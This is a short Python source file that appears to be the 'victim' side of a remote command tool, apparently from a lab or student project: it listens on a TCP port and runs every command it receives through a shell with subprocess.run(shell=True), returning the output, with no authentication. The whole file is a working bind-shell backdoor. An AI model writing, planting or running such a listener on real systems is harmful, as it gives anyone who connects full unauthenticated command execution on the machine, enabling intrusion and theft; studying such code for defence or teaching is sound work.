import socket
import subprocess
from Utils.argument_parser import victim_parse_arguments


def start_server(host='192.168.1.78', port=65433):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.bind((host, port))
    except Exception as e:
        print(f"Error binding to {host}:{port}: {e}")
        return False
    server_socket.listen(5)  # Allows multiple connection attempts
    print(f"Server listening on {host}:{port}")

    while True:
        try:
            conn, addr = server_socket.accept()
            print(f"Connection established with {addr}")
            handle_client(conn, addr)
        except Exception as e:
            print(f"Error with connection: {e}")
def handle_client(conn, addr):
    try:
        data = conn.recv(1024).decode('utf-8')
        if not data:
            print(f"No command received from {addr}. Closing connection.")
            return

        print(f"Command received from {addr}: {data}")
        try:
            # Execute the command and capture the output
            result = subprocess.run(data, shell=True, text=True, capture_output=True)
            response = result.stdout if result.returncode == 0 else result.stderr
        except Exception as e:
            response = f"Error executing command: {e}"

        # Send the output back to the client
        conn.sendall(response.encode('utf-8'))
    except Exception as e:
        print(f"Error handling client {addr}: {e}")
    finally:
        conn.close()


if __name__ == '__main__':
    server_ip, server_port = victim_parse_arguments()
    start_server(host=server_ip, port=server_port)

